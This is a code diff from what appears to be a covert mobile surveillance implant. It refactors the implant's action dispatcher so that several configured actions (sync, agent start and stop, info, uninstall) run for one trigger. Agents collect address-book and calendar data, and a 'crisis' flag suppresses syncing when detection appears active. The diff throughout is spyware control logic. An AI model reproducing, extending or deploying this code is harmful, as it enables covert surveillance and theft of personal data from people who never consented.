@@ -1444,7 +1444,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
                 RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
 #ifdef DEBUG
-                NSLog(@"Starting Agent AddressBook %x and Calendar %x", agentAddress, agentCalendar);
+                NSLog(@"Starting Agent AddressBook %x and Calendar %x",
+                      (unsigned int)agentAddress,
+                      (unsigned int)agentCalendar);
 #endif                
                 [anObject setObject: AGENT_START forKey: @"status"];  
                 
@@ -2206,134 +2208,145 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   NSLog(@"Triggering Action: %d", anActionID);
 #endif
   
-  NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
+  NSArray *configArray = [self getConfigForAction: anActionID];
+  //NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
+  NSMutableDictionary *configuration;
   
-#ifdef DEBUG_VERBOSE_1
-  NSLog(@"conf: %@", configuration);
+#ifdef DEBUG
+  NSLog(@"configArray: %@", configArray);
 #endif
 
-  switch ([[configuration objectForKey: @"type"] intValue])
+  for (configuration in configArray)
     {
+      int32_t type = [[configuration objectForKey: @"type"] intValue];
+      switch (type)
+        {
 #if 0
-    case ACTION_SYNC_APN:
-      {
+        case ACTION_SYNC_APN:
+            {
 #ifdef DEBUG
-        NSLog(@"Starting action Sync APN");
+              NSLog(@"Starting action Sync APN");
 #endif
-        
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
+
+              if ([[configuration objectForKey: @"status"] intValue] == 0)
+                {
+                  if (gAgentCrisis == NO) 
+                    {
+#ifdef DEBUG
+                      NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
+#endif
+                      NSNumber *status = [NSNumber numberWithInt: 1];
+                      [configuration setObject: status forKey: @"status"];
+
+                      [mActions actionSyncAPN: configuration];
+                    }
+                  else 
+                    {
+#ifdef DEBUG
+                      NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
+#endif
+                    }
+                }
+              break;
+            }
+#endif
+        case ACTION_SYNC:
           {
-            if (gAgentCrisis == NO) 
+#ifdef DEBUG
+            NSLog(@"Starting action Sync");
+#endif
+
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                if (gAgentCrisis == NO) 
+                  {
+#ifdef DEBUG
+                    NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
+#endif
+                    NSNumber *status = [NSNumber numberWithInt: 1];
+                    [configuration setObject: status forKey: @"status"];
+
+                    [mActions actionSync: configuration];
+                  }
+                else 
+                  {
+#ifdef DEBUG
+                    NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
+#endif
+                  }
+              }
+            break;
+          }
+        case ACTION_AGENT_START:
+          {
+            // Maybe call directly startAgent form TaskManager here instead of passing
+            // through RCSMActions
+
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
 #ifdef DEBUG
-                NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
+                NSLog(@"AGENT START");
 #endif
+
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
-            
-                [mActions actionSyncAPN: configuration];
+
+                [mActions actionAgent: configuration start: TRUE];
               }
-            else 
-              {
-#ifdef DEBUG
-                NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-#endif
-              }
+
+            break;
           }
-        break;
-      }
-#endif
-    case ACTION_SYNC:
-      {
-#ifdef DEBUG
-        NSLog(@"Starting action Sync");
-#endif
-        
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
+        case ACTION_AGENT_STOP:
           {
-            if (gAgentCrisis == NO) 
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
-#ifdef DEBUG
-                NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
-#endif
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
-            
-                [mActions actionSync: configuration];
+
+                [mActions actionAgent: configuration start: FALSE];
               }
-            else 
+
+            break;
+          }
+        case ACTION_UNINSTALL:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
-#ifdef DEBUG
-                NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-#endif
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                [configuration setObject: status forKey: @"status"];
+
+                [mActions actionUninstall: configuration];
               }
+
+            break;
           }
-        break;
-      }
-    case ACTION_AGENT_START:
-      {
-        // Maybe call directly startAgent form TaskManager here instead of passing
-        // through RCSMActions
-        
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
+        case ACTION_INFO:
           {
 #ifdef DEBUG
-            NSLog(@"AGENT START");
+            NSLog(@"Starting info action");
 #endif
-            
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-            
-            [mActions actionAgent: configuration start: TRUE];
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                [configuration setObject: status forKey: @"status"];
+
+                [mActions actionInfo: configuration];
+                status = [NSNumber numberWithInt: 0];
+                [configuration setObject: status forKey: @"status"];
+              }
+
+            break;
           }
-        
-        break;
-      }
-    case ACTION_AGENT_STOP:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
+        default:
           {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-            
-            [mActions actionAgent: configuration start: FALSE];
-          }
-        
-        break;
-      }
-    case ACTION_UNINSTALL:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-            
-            [mActions actionUninstall: configuration];
-          }
-        
-        break;
-      }
-    case ACTION_INFO:
-      {
 #ifdef DEBUG
-        NSLog(@"Starting info action");
+            NSLog(@"Unknown actionID (%d)", type);
 #endif
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-            
-            [mActions actionInfo: configuration];
-            status = [NSNumber numberWithInt: 0];
-            [configuration setObject: status forKey: @"status"];
+            break;
           }
-        
-        break;
-      }
-    default:
-      return FALSE;
+        }
     }
-  
+
   return TRUE;
 }
 
@@ -2495,8 +2508,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark Getter/Setter
 #pragma mark -
 
-- (NSMutableDictionary *)getConfigForAction: (u_int)anActionID
+- (NSArray *)getConfigForAction: (u_int)anActionID
 {
+  NSMutableArray *configArray = [[NSMutableArray alloc] init];
   NSMutableDictionary *anObject;
   
   for (anObject in mActionsList)
@@ -2508,16 +2522,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
           NSLog(@"Action %d found", anActionID);
 #endif
-        
-          return anObject;
+          [configArray addObject: anObject];
         }
     }
   
-#ifdef DEBUG_ERRORS
-  NSLog(@"Action not found! %d", anActionID);
-#endif
-  
-  return nil;
+  return [configArray autorelease];
 }
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
